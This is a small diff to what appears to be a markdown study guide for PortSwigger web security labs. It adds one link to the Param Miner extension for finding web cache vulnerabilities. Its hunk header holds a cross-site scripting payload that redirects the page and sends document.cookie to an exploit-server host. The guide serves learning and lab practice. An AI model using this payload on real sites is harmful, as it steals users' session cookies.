@@ -60,6 +60,7 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 
 [PortSwigger Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)  
 
+[Param Miner Extension to identify web cache vulnerabilities](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)  
 
 ## Cross Site Scripting
 
